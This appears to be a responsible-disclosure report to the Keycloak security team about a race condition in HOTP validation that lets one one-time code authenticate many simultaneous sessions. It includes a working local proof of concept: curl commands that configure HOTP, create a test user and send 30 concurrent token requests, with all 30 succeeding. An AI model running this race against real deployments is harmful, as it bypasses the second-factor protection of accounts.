Hi Keycloak Security Team,

I am reporting a race condition vulnerability in Keycloak's HOTP
validation that allows a single one-time password to be used for
multiple concurrent login sessions, defeating the purpose of
one-time passwords entirely.

Affected Version: Latest main branch (commit 3c07b879d5cfaf277caa5d4bc96174347f71f91c)
Tested on: Keycloak 999.0.0-SNAPSHOT built from source

AI Disclosure: AI tools were used to assist in drafting this report. The
vulnerability was manually discovered, verified, and reproduced.

DESCRIPTION:
When HOTP is configured as the OTP policy, Keycloak validates the OTP
code and increments the counter in a non-atomic operation. By sending
multiple concurrent authentication requests with the same HOTP code,
all requests validate against the same counter value before any of them
increments it, allowing a single OTP code to authenticate an unlimited
number of simultaneous sessions.

ROOT CAUSE:
The HOTP counter validation and increment are not performed atomically.
There is no locking mechanism to prevent concurrent requests from reading
the same counter value. Each concurrent request independently validates
the OTP against the current counter, succeeds, and then increments it,
but by then all requests have already passed validation.

REPRODUCTION STEPS:

1. Start Keycloak in dev mode on port 8084

2. Get admin token and configure HOTP:

KC=http://localhost:8084
tok() {
  curl -s $KC/realms/master/protocol/openid-connect/token \
    -d client_id=admin-cli -d username=admin -d password=admin \
    -d grant_type=password \
    | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])'
}
T=$(tok)

curl -s -X PUT $KC/admin/realms/master \
  -H "Authorization: Bearer $T" \
  -H 'Content-Type: application/json' \
  -d '{"otpPolicyType":"hotp","otpPolicyAlgorithm":"HmacSHA1","otpPolicyDigits":6,"otpPolicyInitialCounter":0}'

3. Create a test user with HOTP credential:

curl -s -X POST $KC/admin/realms/master/users \
  -H "Authorization: Bearer $T" \
  -H 'Content-Type: application/json' \
  -d '{"username":"racey","enabled":true,"credentials":[{"type":"password","value":"racey","temporary":false}]}'

RACEY_ID=$(curl -s "$KC/admin/realms/master/users?username=racey" \
  -H "Authorization: Bearer $T" | python3 -c 'import sys,json;print(json.load(sys.stdin)[0]["id"])')

T=$(tok)
curl -s -X PUT "$KC/admin/realms/master/users/$RACEY_ID" \
  -H "Authorization: Bearer $T" \
  -H 'Content-Type: application/json' \
  -d "{
    \"credentials\":[
      {\"type\":\"password\",\"value\":\"racey\",\"temporary\":false},
      {\"type\":\"otp\",\"secretData\":\"{\\\"value\\\":\\\"GEZDGNBVGY3TQOJQ\\\",\\\"period\\\":0}\",\"credentialData\":\"{\\\"algorithm\\\":\\\"HmacSHA1\\\",\\\"digits\\\":6,\\\"counter\\\":0,\\\"subType\\\":\\\"hotp\\\",\\\"period\\\":0}\"}
    ]
  }"

4. Use counter 0 code (755224) once to advance counter to 1:

curl -s -X POST $KC/realms/master/protocol/openid-connect/token \
  -d client_id=admin-cli -d username=racey -d password=racey \
  -d grant_type=password -d totp=755224

5. Send 30 concurrent requests with counter 1 code (287082):

for i in $(seq 1 30); do
  curl -s -o /tmp/race_$i.txt -w "%{http_code}" -X POST \
    $KC/realms/master/protocol/openid-connect/token \
    -d client_id=admin-cli -d username=racey -d password=racey \
    -d grant_type=password -d totp=287082 &
done
wait

6. Count successful logins:

SUCCESS=0
for i in $(seq 1 30); do
  grep -q "access_token" /tmp/race_$i.txt 2>/dev/null && SUCCESS=$((SUCCESS+1))
done
echo "Successful logins: $SUCCESS / 30"

RESULT: Successful logins: 30 / 30

All 30 concurrent requests successfully authenticated with the same
one-time password. Expected behavior: only 1 should succeed.

IMPACT:
- Complete bypass of HOTP one-time-password protection
- An attacker who intercepts or phishes a single OTP code can create
  unlimited concurrent sessions before the counter increments
- No admin privileges required — any user account with HOTP is affected
- Defeats the security guarantee of "one-time" passwords
- Particularly dangerous in credential stuffing scenarios where an
  attacker has the password and intercepts one OTP via phishing or
  SIM swap

CVSS 3.1: 8.1 (High)
Vector: AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H

